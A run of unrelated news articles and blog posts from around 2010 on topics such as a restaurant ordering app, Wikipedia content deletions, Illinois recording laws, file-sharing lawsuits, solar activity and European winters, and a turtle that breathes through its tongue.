Unlike most app makers , Kudzu Interactive , which is based in Atlanta , is profitable , and its revenue grew fivefold last year , said Jim Garrett , its founder and chief executive .
The Snapfinger app is free for diners , and Kudzu Interactive charges restaurants 3 percent to 10 percent of each bill .
It makes money every time someone uses the app , not when it is first downloaded .
“ A lot of people think of mobile companies as iPhone app developers who make a product and sell it for 99 cents , ” Mr. Goldman said .
“ This is much more than that .
It ’s a new way to conduct a transaction that everyone does multiple times per week . ”
Many mobile apps , like Yelp and Foursquare , offer information about restaurants , but “ we do n’t see much of a barrier to entry to doing reviews or social stuff related to restaurants , ” Mr. Garrett said .
“ The real trick is being able to place an accurate order and picking it up , and it being ready and prepared on time . ”
Snapfinger presents menus from 28,000 restaurants in 1,600 cities nationwide and in Canada .
The service is most popular , the company says , in Orlando , Fla . ; Chicago ; San Francisco ; Portland , Ore. ; Houston ; and Winnipeg , Manitoba .
People can search for restaurants nearby , order and pay from their phones .
There are tools for group ordering for an office lunch , ordering favorite items with one click and getting location - based , limited - time coupons .

Snapfinger is linked to each restaurant ’s computerized cash register , and it reflects what is available at what price that day .
This real - time information is helpful because each of the hundreds of restaurants in a chain has different prices , daily specials and store hours , and if one runs out of an item , Snapfinger knows it .
Image caption Jimmy Wales has revoked some of his Wikipedia founder 's privileges
A row over sexually explicit content on the web encyclopaedia Wikipedia and related sites has escalated .
Co-founder Jimmy
Wales has given up some of his site privileges following protests by contributors angered that he deleted images without consultation .
Mr Wales had previously urged the removal of " pornographic " content from the user - generated site .
This followed a complaint about " child pornography " to the FBI from another Wikipedia co-founder .
In early April , the estranged co-founder , Larry Sanger , reported Wikimedia Commons to the FBI , alleging that the organisation was " knowingly distributing child pornography " .
He later clarified that his concern was not about photographs of children , but " obscene visual representations of the abuse of children " , which can include drawings and sculpture .
Sexually explicit content
Last week , administrators of Wikimedia Commons , a media file store widely used for Wikipedia articles , deleted hundreds of images .
Some images deemed by the Wikipedia community to have educational merit have since been reinstated .
Mr Wales had earlier posted his support for the removal of " images that are of little or no educational value but which appeal solely to prurient interests " , deleting many pictures himself .
Pressure on the organisation had increased after Fox News reported the story , contacting a number of high - profile corporate donors to the Wikimedia Foundation , which owns Wikipedia , Wikimedia Commons and related sites .
The central question is whether the content is educational Michael Peel , Chair , Wikimedia UK
It asked whether the donors were aware of " the extent of sexually explicit content " on Wikimedia Commons .
It is not clear whether Mr Wales 's support for the removal of explicit content was in response to Mr Sanger 's concerns , pressure from Fox News , or something else .
But Michael Peel , Chair of Wikimedia UK , told BBC
News that a continuous debate over explicit content has recently " come to a head " .
The central issue at the moment , he says , is " whether the content is educational " .
" Anyone can come to Wikimedia Commons and upload media .
Illegal stuff is deleted , and copyright stuff is deleted . "
Mr Wales has faced criticism from the band of volunteers who help to maintain the site , some of whom argued that the decision to delete was undemocratic and taken too quickly .
They also expressed concerns that valid material might be deleted accidentally .
On Sunday , in response , Jimmy Wales voluntarily revoked many of the " permissions " given to him as Wikipedia 's founder , to delete and edit " protected " content on Wikimedia Commons .
In a message to the Wikimedia Foundation mailing list he said this was " in the interest of encouraging this discussion to be about real philosophical / content issues , rather than be about me and how quickly I acted " .
A more detailed policy statement from the Wikimedia Foundation is expected in the coming days .

The Tea Party is n’t a crusade for small government .
It ’s a clash of personal values systems and the types of civilization they suggest .
Whatever the future of the Tea Parties , the fundamental split in Western politics will remain until solved .
The Tea Parties in the USA , Europe and now Canada have really captured my imagination .
It ’s rare to see such a populist upswell in one ’s own lifetime .
What I ’d like to do here is give quick summaries on Tea Party - related ideas :
As pointed out in a recent column , the post - WWII culture wars are coming to a head and it ’s looking a lot like Civil War 2.0 .
These are exciting times , my peeps , and how we handle them determines our future .
If we apply a band - aid , the problems will persist for another dozen generations or longer .
If we opt for inflexibility , we risk war but could separate the middle class , Christian - ish , lower - case “ c ” conservative group from the alienated dropouts .
If we try to make these two incompatible groups co-exist , we pass on war for now but force one to dominate the other in the future , which will continue crippling political discourse and lead to an eventual greater war .
“ May you live in interesting times , ” indeed !

“ Deinstitutionalization , ” the report reads , ” … has been one of the most well - meaning but poorly planned social changes ever carried out in the United States . ”
The emptying of mental hospitals in the latter part of the 20th century was hailed for both cutting government costs and “ liberating ” the people inside .
But for the most serious mentally ill , the move was a disaster , says a recently published by the Treatment Advocacy Center .
Among their findings : Washingtonians who suffer from mental illness are three times as likely to be incarcerated than to be in a mental health treatment center .
Also :
In 1955 , there was one psychiatric bed for every 300 Americans ; in 2005 , there was one for every 3,000 Americans .
And here in Kitsap ?
I have only anecdotal evidence .
In a recent conversation I had with Ned Delmore , head of Kitsap County ’s Juvenile Department , he told me that daily , a large tray moves through the juvenile detention center , carrying psychotropic drugs for those housed inside .
And in many criminal cases I cover , mental health issues are raised — though I am not professionally trained in deciphering which claims are legitimate , and which are not .
Andrew Binion , former Kitsap Sun reporter and current editor at the Central Kitsap Reporter , wrote a story in March 2008 about this very predicament , documenting three local cases .
In part , he said :
“ While the three cases shed light on inconsistencies with how the criminal justice and health care system deals with mentally ill suspects , they also square with what mental health advocates have said for years — that jails and prisons have become warehouses for the mentally ill . ”
Binion writes that Kitsap Mental Health Services has programs for such patients .
But there is too great an “ overflow , ” that spills into jails and prisons — places ill - equipped to treat the mentally ill .
The Treatment Advocacy Center ’s report says we ’ve come full circle :
“ the situation faced by individuals with serious mental illnesses today is remarkably similar to individuals with serious mental illnesses in the 1840s — a shortage of psychiatric beds and an abundance of jail and prison cells .
If Dorothea Dix came back today , she would feel right at home . ”
So what does the report suggest as a solution ?
I ’ll let you read it .

A period of low solar activity could lead to more cold winters in the UK
The ' Big Freeze ' explained The UK and continental Europe could be gripped by more frequent cold winters in the future as a result of low solar activity , say researchers .
They identified a link between fewer sunspots and atmospheric conditions that " block " warm , westerly winds reaching Europe during winter months .
But they added that the phenomenon only affected a limited region and would not alter the overall global warming trend .
The findings appear in the journal Environmental Research Letters .
" By recent standards , we have just had what could be called a very cold winter and I wanted to see if this was just another coincidence or statistically robust , " said lead author Mike Lockwood , professor of space environment physics at the University of Reading , UK .
To examine whether there was a link , Professor Lockwood and his co-authors compared past levels of solar activity with the Central England Temperature ( CET ) record , which is the world 's longest continuous instrumental record of such data .
The researchers used the 351 - year CET record because it provided data that went back to the beginning of the Maunder Minimum , a prolonged period of very low activity on the Sun that lasted about half a century .
Europe is particularly susceptible because it lies underneath the jet stream
Professor Mike Lockwood
The Maunder Minimum occurred in the latter half of the 17th Century - a period when Europe experienced a series of harsh winters , which has been dubbed by some as the Little Ice Age .
Following this , there was a gradual increase in solar activity that lasted 300 years .
Professor Lockwood explained that studies of activity on the Sun , which provides data stretching back over 9,000 years , showed that it tended to " ramp up quite slowly over about a 300 - year period , then drop quite quickly over about a 100 - year period " .
He said the present decline started in 1985 and was currently about " half way back to a Maunder Minimum condition " .
This allowed the team to compare recent years with what happened in the late 1600s .
" We found that you could accommodate both the Maunder Minimum and the last few years into the same framework , " he told BBC News .
Big chill Professor Lockwood said that there were a number of possibilities that could explain the link , but the team favoured the idea of a meteorological phenomenon known as " blocking " .
This affects the dynamics of jet streams , which are very strong winds about 7 - 12 km above the Earth 's surface that can have a major influence on weather systems .
There is one jet stream present in each hemisphere .
Solar activity has been in decline since 1985 , says Professor Lockwood
' No Sun link ' to climate change " Europe is particularly susceptible because , firstly , it lies underneath the ( northern hemisphere 's ) jet stream , " he explained .
A " blocking " occurs when the jet stream forms an " s " shape over the north - eastern Atlantic , causing the wind to fold back over itself .
" If you have n't got blocking , then the jet stream brings the mild , wet westerly winds to give us the weather we are famous for . "
But , he added , if the jet stream is " blocked " , and pushed further northwards , then cold , dry winds from the east flow over Europe , resulting in a sharp fall in temperatures .
" This ... ' blocking ' does seem to be one of the things that can be modulated by solar activity , " he said .
Recent studies suggest that when solar activity is low , " blocking " events move eastwards from above north - eastern North America towards Europe , and become more stable .
A prolonged " blocking " during the most recent winter was responsible for the long spell of freezing conditions that gripped Europe .
Written observations from the period of the Maunder Minimum referred to the wind coming from the east during particularly cold winters , which strengthened the team 's " blocking " hypothesis .
The way in which solar activity affects the behaviour of blocking episodes is linked to the amount of ultraviolet ( UV ) emissions being produced by the Sun.
Solar UV heats the stratosphere ( 20 - 50 km above the surface ) , particularly the equatorial stratosphere .
This results in a temperature gradient , which leads to the formation of high level winds .
" The change in solar activity undoubtedly changes the stratospheric winds , " said Professor Lockwood .
Studies have shown that the state of the stratosphere can make a considerable difference to what happens in the troposphere , which is where the jet stream occurs , Professor Lockwood explained .
" There has been some quite simple modelling that indicated that heating the equatorial stratosphere with more UV would actually move the jet streams a little bit , by just a few degrees .
" That , of course , has the potential to change the behaviour of the jet streams - and that is the sort of thing that we think we are seeing . "
' Blocking central ' Professor Lockwood was keen to stress that " blocking " only affected a limited geographical region , and would not have a widespread impact on the global climate system .
To illustrate the point , he said that while the CET record showed that this winter was the UK's 14th coldest in 160 years , global figures listed it as the fifth warmest .
He said that one of his colleagues at the University of Reading referred to Europe as " blocking central " .
" Frost fayres " were held on the Thames during the Maunder Minimum " The reason is largely because the jet stream has to come to us over the Atlantic Ocean and it is slowed down when it hits the land in Europe .
" You do n't quite have the same combination of circumstances anywhere else in the world that gives you such strong blocking . "
While the current decline in solar activity is expected to continue in the coming decades , he cautioned that more frequent " blocking " episodes would not result in Europe being plunged into sub-zero temperatures every winter .
" If we look at the last period of very low solar activity at the end of the 17th Century , we find the coldest winter on record in 1684 , but the very next year - when solar activity was still low - saw third warmest winter in the entire 350 - year ( CET ) record . "
A number of other meteorological factors also influenced the weather systems over Europe , so a number of parameters had to be met before a " blocking " occurred , he observed .
Responding to the team 's findings , Dr Peter Stott , head of climate monitoring and attribution at the UK Met Office , said : " This paper provides some additional evidence that what happens in the stratosphere could be important for climate at the surface . "
But he added : " The findings are suggestive of a possible effect but more research is needed to pin down the mechanisms and determine how significant such effects could be for determining the probability of cold winters in the UK .
" At the Met Office , we are already working on research into incorporating better representation of the stratosphere into our seasonal and decadal forecasting models . "
Professor Lockwood said he now planned to examine the influence of low solar activity on European weather during the summer months .

I could come in here to fight for the religion side of things , since I know I 'm in the minority here , being a Christian who does in fact believe in science too .
I could mention how not all of us think the world is 4000 years old , or how I laugh at people who think dinosaur bones were put on earth to test our faith .
I could mention the fact that I believe in a God who can do anything , including using the big bang to create the universe .
I could mention the hypocrisy from religious people who say God can do anything , but evolution is impossible .
I could mention that most of us do n't believe that prophets exist ( not any more at least ) or that speaking in tongues is real .
I could mention how I think science and religion are two languages speaking the same thing .
I could mention that the people who say religion discriminates against people , be them black , white , or any other color of the rainbow are wrong .
I could mention that time someone accused me of being a member of the KKK for being a Christian , and disliking rap music .
I could mention the ignorance and hate on both sides toward the other .
But I gave up on have an intelligent conversation on this particular subject a while back , due to the idiocy on both sides .
The fact is for some reason , scientists hate religion , and religious people hate scientists .
Nothing I can say will change that .
Olson Kundig Architects designed the Chicken Point Cabin in a rural area of Northern Idaho .
The idea for the cabin is that of a lakeside shelter in the woods — a little box with a big window that opens to the surrounding landscape .
The cabin ’s big window - wall ( 30 feet by 20 feet ) opens the entire living space to the forest and lake .
The design concept is composed of basically three parts : a concrete block box with a plywood insert and a 4 - foot diameter steel fireplace ( the bong ) .
Materials are low maintenance — concrete block , steel , concrete floors and plywood — in keeping with the notion of a cabin , and left unfinished to naturally age and acquire a patina that fits in with the natural setting .
Open interior spaces are intended to be a seamless extension to the natural setting .
A 19 - foot tall steel entry door can accommodate long skis .
The cabin sleeps ten .
Last week , an Illinois judge rejected Chicago artist Christopher Drew 's motion to dismiss the Class I felony charge against him .
Drew is charged with violating the state 's eavesdropping statute when he recorded his encounter with a police officer last December on the streets of Chicago .
A Class I felony in Illinois is punishable by 4 to 15 years in prison .
It 's in the same class of crimes as sexual assault .
Drew will be back in court in June to request a jury trial .
I 'm currently working on a feature for Reason about man in a more rural part of the state charged with six violations of the same statute , all of them for making audio recordings of on - duty public officials .
For several of the counts in that case , the police were actually on the man 's property .
He started recording his conversations with police because he felt he was being unjustly harassed for violating a town ordinance he thought was unconstitutional .
I 'm of the opinion that it should always be legal to record on - duty police officers , both as a matter of policy and under the free speech , free press , and right to petition the government provisions in the First Amendment .
We saw the power and potential of audio and video recording technology to expose government abuse in the Iranian protests last summer .
But we also see it here in the U.S. with the thousands of police misconduct videos uploaded to YouTube in recent years .
Typically , police who want to arrest someone for recording them while on duty use a strained interpretation of state wiretapping laws or whatever state or local law addresses obstructing or interfering with law enforcement .
These incidents are troubling enough , and I think state legislatures should consider passing laws explicitly making it legal to record on - duty law enforcement officials .
Those laws should include remedies for people wrongly arrested , or who have had their cameras or cell phones illegally confiscated , damaged , or destroyed .
But in Illinois the situation is quite a bit worse .
In Illinois it actually is illegal to make audio recordings of on - duty cops–or any other public official .
Illinois is one of a handful of states that require all parties to consent before someone can record a conversation .
But the other all - party - consent states also include a provision in their statutes stating that for there to be a violation of the law the nonconsenting party must have a reasonable expectation of privacy .
On - duty police officers in public spaces have no such expectation .
Here 's where it gets even worse :
Originally , the Illinois eavesdropping law did also include a similar expectation of privacy provision .
But the legislature stripped that provision out in 1994 , and they did so in response to an incident in which a citizen recorded his interaction with two on - duty police officers .
In other words , the Illinois legislature specifically intended to make it a Class I felony , punishable by up to 15 years in prison , to make an audio recording of an on - duty police officer without his permission .
Given the spate of recent stories about cops in Chicago caught on video misbehaving ( some of whom were subsequently held accountable only because of the video ) , the legislature 's already - awful - when - it - passed 1994 amendment has n't aged well .
I suspect most state officials know this law is unconstitutional .
While several people have been charged under the statute for recording public officials , I 've so far been unable to find anyone who was actually convicted , much less had a conviction upheld .
( If you know of someone who has , please email me ! )
Prosecutors tend to either drop the charges or offer a plea bargain before the case gets to trial .
It is n't difficult to see why someone would take a misdemeanor plea and a clean record instead of challenging a bad law and risking up to 15 years in prison and a felony record if they lose .
Before Drew the closest anyone came to challenging the law came in 2004 , when documentary filmmaker Patrick Thompson was arrested for recording police interactions with patrons outside of bars and restaurants in Champaign - Urbana .
He was looking to document allegations that police were treating white patrons differently than black patrons .
( See the ACLU 's brief on Thompson 's behalf here ) .
But Thompson took a plea bargain before his case went to trial .
So the law remains on the books .
Which Illinois police officers remain authorized by state law to detain , arrest , and jail people who record them while on - duty , and they can continue to confiscate the recordings .

UPDATE / CORRECTION : Eugene Volokh emails to say that Massachusetts also does n't appear to recognize an expectation of privacy exception to its all - party - consent law , and has upheld a conviction for recording on - duty police officers .

Facebook turns on Palin
Former Alaska GOP Gov. Sarah Palin's endorsement of Carly Fiorina in California 's Senate race has prompted a fervent blowback on her Facebook page , long Palin 's safe haven for delivering her message .
The revolt is coming from Palin supporters who also back Chuck DeVore — a Tea Party favorite who is campaigning against Fiorina in the Republican primary .

Palin ’s Facebook page is littered with comments opposing her endorsement of Fiorina , the former CEO of Hewlett - Packard .
“ The only REAL CONSERVATIVE is Chuck DeVore .
Fiorina is a RINO and we do n't need any more of those in [ California ] , ” one irate commenter wrote .
“ Why would n't you back Chuck DeVore ? ? ? ”
“ Sorry Sarah , but I think Chuck DeVore is the conservative candidate you should be supporting , ” added another , who was followed up by a DeVore supporter who wrote : “ I do n't agree with this endorsement AT ALL !
What are you thinking , Sarah ? ”
The impassioned revolt from some of her most faithful supporters prompted Palin to update her post to “ add a few things about my Carly endorsement because some reaction right out of the chute calls for more information . ”
In her original post , Palin made no mention of Fiorina ’s social views , but in the update Palin touted the former CEO ’s opposition to abortion rights .
“ Carly has been endorsed by the National Right to Life , the California Pro-Life Council , and the Susan B. Anthony List , ” Palin wrote of Fiorina .
“ She is pro-life , pro-traditional marriage , pro-military , and pro-strict border security and against amnesty . ”
“ Carly is also a strong supporter of the Second Amendment , ” she added .
“ Like me , she is a member of the NRA , has a 100 % NRA rating , and she and her husband are gun owners .
She is pro-energy development and believes as I do in an all - of - the - above approach to energy independence .
She is against cap and tax .
And most importantly , Carly is the only conservative in the race who can beat Barbara Boxer . ”
Palin concluded : “ That ’s no RINO .
That ’s a winner . ”
A Palin spokesman did not immediately respond to a request for comment .
Palin ’s endorsement of Fiorina came as something of a surprise Thursday , as DeVore ’s Tea Party supporters seem to be a more natural fit for the former governor .
Additionally , Fiorina once said during the height of the presidential campaign that Palin was not qualified to run a “ major corporation . ”
Fiorina later took a step back from the remark , saying she did n’t believe John McCain or Barack Obama could run such a company either .
Both the Lib Dems and the Conservatives have said they would scrap ID cards , and this is good news .
What is equally important , however , is the way in which ID cards are used .
Citizens in some countries with national ID cards ( such as France or Spain ) rarely show them on a day - to - day basis .
Paradoxically , we do n't yet have cards , but we do have a culture of routine ID checking .
" Do you have any ID ? " is a question we increasingly face when going about our business in the streets or at work .
A Manifesto Club survey found that people in their late 20s and 30s are being routinely checked not just for buying alcohol , but also for attempting to purchase items such as barbecue skewers , bleach , paracetamol , UHU glue , matches , cigarette papers , even a " gentleman 's manicure set " .
Two women in their late 20s had been ID - checked for bottles of wine so frequently that they now carry their passports to go to the supermarket .
Passport checks are becoming routine in working life too .
Some organisations have started collecting passport details from staff of 10 or 20 years standing to check they have the right to work in the UK .
Universities including Nottingham , Southampton , Lancaster and Lampeter have asked visiting lecturers and external examiners to produce their passports before they can be paid .
The musician DJ Moth reports that one of London 's major jazz clubs in Hackney now requires performers to give passport details .
Then there is the downright bizarre .
A reader of the magazine Today 's Railways Europe wrote in to say that he was asked to produce his passport in the Luton branch of Thomas Cook , when attempting to buy a copy of Cook 's European rail timetable .
He was told that this was for " security reasons " .
As a point of historical comparison , the Common Travel Area ] has allowed passport - free travel between the Republic of Ireland and the UK since 1923 , including throughout the Troubles .
Now the Home Office is attempting scrap this agreement and oblige people to show ID documents or be refused passage .
Regular travellers on ferries between northern Ireland and Scotland already report that passengers ( usually of African origin ) are now being pulled out of the queue and asked to show their documents .
Shops and businesses ask for ID under the threat of heavy fines for serving underage drinkers or for employing somebody who is not entitled to work in the UK .
Yet like the ID card scheme itself , this is a policy looking for a justification .
At base , this is less about combating specific social issues than about the growing state regulation of citizens .
The meaning of ID checks is that we are constantly being asked to ( as the posters say ) " Prove it ! " : to prove our age or nationality , to prove that we are allowed to be where we are , doing what we are doing .
The assumption is that unless we can produce documents we are probably not supposed to be here , not supposed to be giving a lecture or buying barbecue skewers .
This culture of checking calls forth ID cards of some kind ( unless we just start carrying our passports around everywhere ) .
Companies have sensed a business opportunity and produce proof - of - age cards under the banner of the officially accredited Pass Scheme , " the national proof - of - age accreditation scheme " .
One of these cards has the horribly revealing name , Validate UK : " a voluntary proof of age scheme for all ages " .
The illiberal underpinnings of these schemes are clear .
To be a UK citizen you must be validated .
" No pass , no sale " , says the banner on the Pass Scheme website .
And so the demand of " Pass , please ! " , so beloved of authoritarian regimes , comes to the British Isles .
You do not have a right to pass : you need to prove your legitimacy by proffering your documents .
No pass , no sale ; no pass , no job ; no pass , no ferry crossing to Holyhead .
Challenging this culture of ID checking is as crucial as taking on the ID card scheme itself .
As free citizens we should not have to produce our papers at the local supermarket .
We must assert again our right to pass .
The file - sharing public faces yet another wave of predatory litigation , this time from the so - called US Copyright Group ( " USCG " ) , which is suing BitTorrent users on behalf of various independent filmmakers .
The Hollywood Reporter reports that more than 20,000 individuals have been sued , with more suits to come , and the producers of the Oscar - winning The Hurt Locker have also signed up with the USCG to go after BitTorrent users .
USCG 's infringement lawsuits are " Doe suits , " much like the cases in the infamous Recording Industry Association of America litigation campaign .
Just as the RIAA did for years , the US Copyright Group uses an investigator to identify IP addresses associated with allegedly infringing downloads , files copyright infringement suits against anonymous Does , and then tries to hijack the subpoena process to get ISPs to match the IP addresses to actual names .
( We 'll have more to say in a later post about USCG 's abuse of the legal process . )
Veterans of the file - sharing wars know that this story has no happy ending .
The filmmakers — perhaps promised an alternative revenue stream in the form of settlements — are in for a bumpy ride .
First , we 'll see an abuse of the legal process to identify anonymous Internet users .
Already , ISP Time Warner Cable ( TWC ) has pushed back against USCG 's demand for hundreds of subscriber names and IP address lookups on short notice .
If TWC succeeds — and it should — it will help put the brakes on USCG 's effort to cut their own costs by serving mass subpoena requests .
In other words , the lawsuits could get a little more expensive .
Then , once identities are revealed , we 'll inevitably start hearing about the " dolphins in the driftnet " — people who are improperly targeted but nonetheless forced to settle or defend .
Meanwhile , despite the flurry of legal action , BitTorrent use will continue unabated and only the lawyers will see any increase in their bottom line .
This much should be abundantly clear by now : creators must move beyond suing the audience .
File - sharers are characterized as shallow thieves , when in reality they 're just fans who are using one of the most efficient technologies for distribution ever invented to explore creative works in the most convenient way possible .
The majority of these fans would like to live in a world where there 's an efficient , effective , modern framework for compensating the creators .
That framework will be built through innovation and experimentation — not litigation .
Happily , some filmmakers and innovators are already working hard to develop better , more flexible models .
After initially failing to attract a distributor for the feature film Four Eyed Monsters — despite success at a number of festivals — filmmaker Arin Crumley and co-director Susan Buice embraced alternative , Internet - driven distribution strategies including in - depth " making - of " podcasts , fan - driven screening requests , and the posting of the film in full on YouTube .
Crumley is hoping to embed the successful elements of these various experiments into OpenIndie , a website in beta that seeks to provide creators with a new way to distribute and screen films .
OpenIndie will allow filmmakers to post trailers and information about their films to the site , while film buffs can use the site to request screenings of films they like .
Filmmakers can then get a roster of their fans , giving them the ammo they need to convince theaters to show the film in regions where there 's guaranteed interest .
OpenIndie also plans to make it easier for superfans to host a screening , collect donations , and offer merchandise on behalf of the filmmaker , creating a new level of creator - audience interaction and support that capitalizes elegantly on unique aspects of the film experience unavailable through infringement : seeing a film with others , being one of the first to support quality creative work , and so on .
Filmmaker and animator Nina Paley is another noteworthy creator finding success through alternative distribution of her animated feature Sita Sings the Blues .
After critical acclaim , and after having to pay crushing licensing fees to copyright owners ( since she incorporated blues songs originally written the 1920s into the film ) , Paley avoided traditional film distribution deals and instead released the film under a Creative Commons Attribution - Share Alike license , writing :
You do n't need my permission to copy , share , publish , archive , show , sell , broadcast , or remix Sita Sings the Blues .
Conventional wisdom urges me to demand payment for every use of the film , but then how would people without money get to see it ?
How widely would the film be disseminated if it were limited by permission and fees ?
Control offers a false sense of security .
The only real security I have is trusting you , trusting culture , and trusting freedom .
And how successful has Sita Sings the Blues actually been ?
The QuestionCopyright.org site has been tracking the results of her alernative distribution project and summarizes the findings thusly :
Best of all , her income stream is fairly steady .
This is the opposite of the traditional " burst and fade " distribution model that so many works endure , dragged out of circulation prematurely to avoid competing with new releases from the same publisher .
Because Nina 's film is audience - distributed , it 's in circulation forever , whenever and wherever people want to see it .
And all those audience members are potential customers and donors , as the financial results bear out .
A less measurable factor than " profit " that many passionate creators will nonetheless find to be important is the emotional , creative impact of embracing alternative distribution .
According to Nina Paley , the success and thrill of Sita Sings the Blues can be felt in ways beyond the business model built around the work itself .
Overall , a prevalent theme for those leading the way in getting paid for creative work is an acceptance of copying as an integral aspect of modern life that gives creators unprecedented advantages and flexibility .
In a recent interview , author ( and former EFF staffer ) Cory Doctorow said :
As a practical matter , we live in the 21st century and anything anybody wants to copy they will be able to copy .
If you are building a business model that says that people can only copy things with your permission , your business is going to fail because whether or not you like it , people will be able to copy your product without your permission .
The question is : what are you going to do about that ?
Are you going call them thieves or are you going to find a way to make money from them ?
And to that end , innovative sites are stepping in to give creators new tools and diverse choices for fundraising , like Kickstarter 's development of the crowdfunding concept , and Flattr 's experimentation with social micropayments .
These services seek to capitalize on the deep , direct engagement made possible by the Internet — enlisting the audience , rather than attacking it .
Independent filmmaking is extraordinarily challenging , and part of the challenge is getting compensated for your hard work .
But the lessons from litigation in the music space could not be more clear : suing your fans is no way to meet that challenge .
We urge filmmakers to learn from the creators profiled above , experiment with the new tools at their disposal , and to lead the way in finding better way forward .
Once the water has cooled to a warm / lukewarm temperature ( add your ice now to speed this )
Dunk the rag into the tea , and dab it onto the sunburn .
Do not wipe it off !
Leave it on and let it be absorbed into your skin .
Once its dry , re-apply as necessary , but never wash it off .
If you do this process before bedtime , you can go to sleep and give it time to work its magic .
In the morning you can wash it off in your shower .
Hopefully , your sunburn will be substantially subdued , but remember : the sooner you can apply the tea after you get the burn , the quicker and more effective it will be .
Note : I had a severe sunburn and I also used the tea bags straight up , dabbing them directly onto my skin .
You may use as many " coats " of tea as you want , but the more the better .

WBO World welterweight champion , The Ring light welterweight champion , and the province of Sarangani ’s member of the Philippines House of Representatives .
These accolades just brush the surface of Manny Pacquiao ’s success both in and out of the boxing ring .
Emmanuel “ Manny ” Dapidran Pacquiao is arguably ( aside from the opinions of Mayweather fans ) the number 1 pound - for - pound best boxer in the universe and the brute force of his punch is matched only by his competitive spirit and ferocity to be a champion in all walks of life .
Clearly , I am in Pacman ’s corner and to further show my appreciation for this Filipino pugilist I present to you the Nike Trainer SC 2010 Low Manny Pacquiao Pac Man .
Boxing is a struggling sport and would be completely off the map if it were n’t for Manny Pacquiao and the prospect of a dream fight between himself and undefeated showman Floyd “ Money ” Mayweather , Jr. Under the expert tutelage of trainer Freddie Roach , Manny has expanded the wonderful world of Pacland across the sports scene with his unorthodox training rituals and violent fighting style .
After becoming the first boxer in history to win seven world titles in seven different weight divisions , I guess Manny did n’t find enough challenges between the ropes so he decided to throw his hat into the political ring and run for congressman in his native Philippines .
National hero that he is , Manny won his seat in the Filipino House of Representatives in a landslide and now can divide his time between smashing dudes ’ faces in and passing legislation to better his home country .
Following a wildly successful limited release run in early 2009 , the Nike Trainer SC 2010 Low Manny Pacquiao Pac Man is back by popular demand and the reigning king of the sneaker ring .
With a white and red base accented by a metallic gold and blue trim , the Pac Man ’s reflect some of the classic colors of boxing – the red gloves , the blue mat , and the shimmering gold of a championship belt .
Stitched on the back heel of the left shoe is the text “ Pac ” and , sure enough , on the back of the right heel is the “ Man ” portion of Pacquiao ’s nickname .
The icing on the cake is the customized insole designed with Manny ’s face and other cartoon images of boxing gloves , title belts , and even Freddie Roach ’s mug for you to stomp all over .
Whether you are a boxing fan or not , the Nike Trainer SC 2010 Low Manny Pacquiao Pac Man ’s are pure fire and can be purchased at Osneaker.com for $ 135 .
Thing I Did Today Some Might Think Out of Character ( But Is n’t )

Pulled the Bible down off the shelf , read a passage to my daughter and then discussed it with her for a good long time .
Which passage ?
This one .
Why ?
Because Jesus had some smart things to say .

Former US president George W. Bush and his top aides were accused Friday of covering up that many Guantanamo Bay detainees were innocent , amid fears releasing them could harm the ‘ war on terror ’ .
The allegations were made in a document by Colonel Lawrence Wilkerson , once chief of staff to Bush ’s first secretary of state , Colin Powell , in a lawsuit filed by a former Guantanamo inmate and published by The Times in London .
ADVERTISEMENT
Wilkerson alleged Bush ’s vice president , Dick Cheney , and defence secretary Donald Rumsfeld knew that most detainees held at the US detention camp in 2002 were innocent but believed it was “ politically impossible to release them ” .
They were also keen to avoid revealing the “ incredibly confused ” detention operation , Wilkerson said , claiming prisoners were often rounded up by Afghan and Pakistani forces in return for cash , with little or no evidence as to why .
He alleged Cheney “ had absolutely no concern that the vast majority of Guantanamo detainees were innocent …
If hundreds of innocent individuals had to suffer in order to detain a handful of hardcore terrorists , so be it ” .
Wilkerson , who according to The Times has been a long - time critic of the Bush administration ’s approach to counter - terrorism , said he discussed the issue with Powell , who left his job in 2005 .
“ I learnt that it was his view that it was not just vice president Cheney and secretary Rumsfeld , but also president Bush who was involved in all of the Guantanamo decision - making , ” the newspaper reported him as saying .

Wilkerson ’s statement was filed in support of Adel Hassan Hamad , a Sudanese man held at Guantanamo Bay from March 2003 until December 2007 .
He claims he was tortured by US agents and filed a damages action Thursday , The Times said .
Some 183 detainees remain at the US military prison at Guantanamo Bay on Cuba , including dozens already cleared for release .
Most have been held without charge or trial .

Sternotherus odoratus turtle .
Image credit : Wikipedia .
( PhysOrg.com ) --
The North American common musk turtle ( Sternotherus odoratus ) is a pretty ordinary sort of turtle except for one thing newly discovered by Austrian scientists : it can breathe through its tongue , which allows it to remain underwater for months .
Researchers Egon Heiss and colleagues from the Department of Theoretical Biology at the University of Vienna in Austria , were using high - speed video to study the feeding habits of the musk turtle , a reptile from the eastern U.S. states and in southern Canada , where it lives in freshwater bodies such as lakes and rivers .
They discovered the adults spend most of their lives submerged but young turtles sometimes venture on land to look for food .
They noticed the turtles can grasp food on land using their jaws but their tongues are clumsy at manipulating food , which is always dropped during the attempt .
The only way they can eat the food is to first drag it into the water .
They studied the turtle ’s tongue with scanning electron microscopes and light microscopes to find out why , and were surprised to learn the tiny tongue is poorly developed and weak , and is covered in highly vascularized buds or “ papillae . ”
After carrying out further tests the researchers found the tongue plays an important role in gas exchange when the turtle is underwater , drawing in oxygen from the water through the tongue .
Some freshwater turtles must come to the surface to breathe , while others breathe underwater through their skin or using cavities in their rear ends called cloacal bursae .
Marine turtles must come to the surface to breathe every few hours .
The common musk turtle has until now baffled scientists because it its skin is too thick to breathe through and is poorly supplied with blood , it does not have cloacal bursae , and does not come up for air .
Heiss said in a BBC
News interview that they “ knew that an organ for aquatic respiration must be present somewhere but [ we ] finally discovered it accidentally . ”
The same kind of papillae are also found on the tongues of soft - shelled turtles , but are not found on the European pond turtle ( Emys orbicularis ) , which lives in similar habitats to the musk turtle and does not breathe underwater .
The similarity of the tongues of the musk turtle and soft - shelled turtles suggest the trait may have been present in a shared ancestor of the two groups , and would give the animals an advantage in their aquatic habitat .
The paper was published in the journal The Anatomical Record .

Last week , though , Sony introduced another jaw - dropping step forward in the big sensor / small camera race : a tiny machine called the Alpha NEX - 5 .
It wo n’t be available until July , but it may be worth waiting for .
Like the Samsung , the NEX - 5 contains an APS - C - size sensor — awesome .
Yet this camera is amazingly , crazily small .
It ’s half the weight and volume of a small S.L.R. ; in fact , without the lens , it ’s about the size of a regular pocket camera ( 4.4 by 2.4 by 1.6 inches — only an inch thick except at the grip bulge ) .
The lens barrel is actually taller than the camera itself .
Anyway , it ’s the smallest interchangeable - lens camera in the world .
With lens attached , the tiny NEX - 5 looks a little bizarre — even ridiculous , like a mere backplate for a lens .
But keep an open mind ; it still handles well .
Image
